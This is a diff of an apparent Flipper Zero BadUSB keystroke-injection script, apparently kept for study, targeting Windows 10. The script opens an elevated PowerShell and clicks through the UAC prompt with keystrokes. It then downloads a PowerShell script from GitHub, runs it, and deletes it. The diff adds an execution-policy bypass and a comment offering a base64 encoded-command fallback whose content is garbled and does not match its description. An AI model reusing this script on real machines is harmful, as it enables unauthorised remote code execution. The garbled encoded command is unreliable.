@@ -7,30 +7,32 @@ REM Meant for Windows 10
 REM Running Powershell as an Admin
 GUI r
 DELAY 200
-STRING powershell Start-Process powershell -Verb runAs
+STRING powershell -ExecutionPolicy Bypass -Command "Start-Process powershell -Verb RunAs"
 ENTER
 DELAY 1500
 SHIFT TAB
 DELAY 500
 ENTER
 DELAY 1500
+STRING cd C:\
+ENTER
+
+REM If ExecutionPolicy Bypass does not work, you can use the base64 encoded version of the command.
+REM powershell.exe -EncodedCommand "RwBlcnNvbmFkZVBvbGljeSBCYXNlIHN5c3RlbSB7IFN0YXJ0LXByb2Nlc3MgcG93ZXJtaW5nIFwibmFtZSIsIFwibW92ZSB3aXRob3V0IHJlc2VhcmNoIGVtb3Rpb25zIiwgXCJtYXN0ZXIiLCAicmVhZEFzIGJ5IHRoZSBzZWNyZXR9IHwgU3RhcnQtUHJvY2Vzc3MgcG93ZXJtaW5nLmV4ZT0gIkJheXBhbGVkLVBvd2VybWluZy4lMjIi"
+
 REM Downloading the deleteFile.ps1 from GitHub and running it
 STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/aenslei/flipperZero-studies/raw/main/Powershell/deleteFile.ps1', 'C:\deleteFile.ps1')
 ENTER
 DELAY 5000
 
-REM Changing Powershell ExecutionPolicy for current session and Running the deleteFile.ps1
-STRING cd C:\
-ENTER
-STRING pwsh.exe -ExecutionPolicy AllSigned
-ENTER
+REM Running the deleteFile.ps1
 STRING .\deleteFile.ps1
 ENTER
 
 REM Deleting the deleteFile.ps1
 STRING Remove-Item -path deleteFile.ps1
 ENTER
-DELAY 5000
+DELAY 500
 
 REM Test Case
 STRING echo Script#6 Completed
